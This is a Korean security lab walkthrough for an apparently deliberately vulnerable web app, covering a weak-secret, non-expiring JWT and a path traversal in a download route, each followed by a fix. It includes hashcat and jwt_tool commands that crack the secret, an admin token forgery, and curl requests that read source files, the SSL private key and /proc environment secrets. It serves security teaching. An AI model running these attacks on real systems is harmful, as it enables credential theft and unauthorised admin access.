# #07 JWT Weak Secret  ·  #08 Path Traversal

**OWASP** A07 Auth Failures / A01 Broken Access Control  ·  **난이도** ⭐⭐⭐

---

## #07 — JWT Weak Secret + No Expiration

### 취약점 원인

두 가지 문제가 결합되어 있습니다.

| 문제 | 위치 | 내용 |
|------|------|------|
| 약한 시크릿 키 | `docker-compose.yml` | `JWT_SECRET=secret` |
| 만료 시간 없음 | `auth.js` jwt.sign | `expiresIn` 미설정 |

**`backend/routes/auth.js` — 73번째 줄**
```js
const token = jwt.sign(
  { id: user._id, userId: user.userId, role: user.role },
  JWT_SECRET   // ❌ expiresIn 없음 → 토큰 영구 유효
);
```

---

### 공격 실습

#### Part A — JWT 분석

**Step 1** — 로그인 후 DevTools → Application → Local Storage → `token` 값 복사

**Step 2** — `https://jwt.io` 에 붙여넣기 → Payload 확인
```json
{
  "id": "681234...",
  "userId": "alice",
  "role": "User"
  // exp 필드 없음 → 영구 유효
}
```

---

#### Part B — 시크릿 크래킹 → 토큰 위조

**Step 1** — hashcat으로 시크릿 크래킹
```bash
# JWT를 파일에 저장
echo "<JWT 토큰>" > jwt.txt

# 사전 공격
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# → secret 발견
```

또는 `jwt_tool`:
```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

**Step 2** — jwt.io에서 토큰 위조

Verify Signature 란에 `secret` 입력 → Payload 수정:
```json
{
  "id": "681234...",
  "userId": "alice",
  "role": "Admin"   ← User → Admin 으로 변경
}
```
jwt.io가 새 서명을 포함한 위조 토큰을 생성합니다.

**Step 3** — 위조 토큰으로 관리자 API 호출
```js
// DevTools Console
const fakeToken = "eyJhbGciOiJIUzI1NiIs...위조된_토큰";

fetch('/api/board/<게시글_ID>', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + fakeToken
  },
  body: JSON.stringify({ status: 'Hidden' })  // 관리자 전용 기능
}).then(r => r.json()).then(console.log);
```

---

#### Part C — 영구 토큰 악용

만료 시간이 없으므로 XSS·로그 노출 등으로 탈취한 토큰은 **서버 재시작 또는 시크릿 변경 전까지 영원히 유효**합니다.

---

### 방어

**`docker-compose.yml`** — 강력한 시크릿
```yaml
- JWT_SECRET=a3f9b2c7e8d1f4a6b9c2e5f8a1d4g7h0i3j6k9...  # 랜덤 64자 이상
```

**`auth.js`** — 만료 시간 추가
```js
const token = jwt.sign(
  { id: user._id, userId: user.userId, role: user.role },
  JWT_SECRET,
  { expiresIn: '1h' }  // 1시간 만료
);
```

---
---

## #08 — Path Traversal

### 취약점 원인

파일 다운로드 API가 파일명에서 `../` 경로 탈출 문자를 필터링하지 않습니다.
`uploads/` 디렉터리를 벗어나 서버의 임의 파일을 다운로드할 수 있습니다.

**`backend/routes/board.js` — 134번째 줄**
```js
router.get('/download/:filename', (req, res) => {
    // ❌ req.params.filename 필터링 없음
    const file = path.join(__dirname, '..', 'uploads', req.params.filename);
    res.download(file);
});
```

`path.join`은 `../`을 정규화합니다:
```
/app/routes/../uploads/../../server.js  →  /app/server.js
```

---

### 컨테이너 내 디렉터리 구조

```
/app/
├── server.js          ← 소스코드
├── routes/
│   ├── auth.js        ← JWT 로직 포함
│   └── board.js
├── certs/
│   ├── server.key     ← SSL 개인 키
│   └── server.cert
└── uploads/           ← 정상 접근 범위
```

---

### 공격 실습

Express 라우터가 `/`를 파라미터로 받지 않으므로 URL 인코딩된 `%2F` 사용

**서버 소스코드 탈취**
```bash
curl -k -o server.js \
  "https://192.168.1.20:5000/api/board/download/..%2F..%2Fserver.js"
```

**auth.js 탈취** (JWT 시크릿 코드 확인)
```bash
curl -k -o auth.js \
  "https://192.168.1.20:5000/api/board/download/..%2Froutes%2Fauth.js"
```

**SSL 개인 키 탈취**
```bash
curl -k -o server.key \
  "https://192.168.1.20:5000/api/board/download/..%2Fcerts%2Fserver.key"
```

**환경변수 탈취** (JWT_SECRET, MONGO_URI 포함)
```bash
curl -k -o env \
  "https://192.168.1.20:5000/api/board/download/..%2F..%2F..%2Fproc%2F1%2Fenviron"
```

> **연계 공격** — `auth.js` 또는 환경변수에서 `JWT_SECRET` 확인 → 취약점 #07 JWT 위조로 연계

---

### 방어

```js
router.get('/download/:filename', (req, res) => {
    // path.basename()으로 경로 문자 제거
    const safeFilename = path.basename(req.params.filename);
    const uploadsDir   = path.resolve(__dirname, '..', 'uploads');
    const filePath     = path.resolve(uploadsDir, safeFilename);

    // uploads 디렉터리 밖이면 차단
    if (!filePath.startsWith(uploadsDir + path.sep)) {
        return res.status(403).json({ message: 'Access denied' });
    }

    res.download(filePath);
});
```
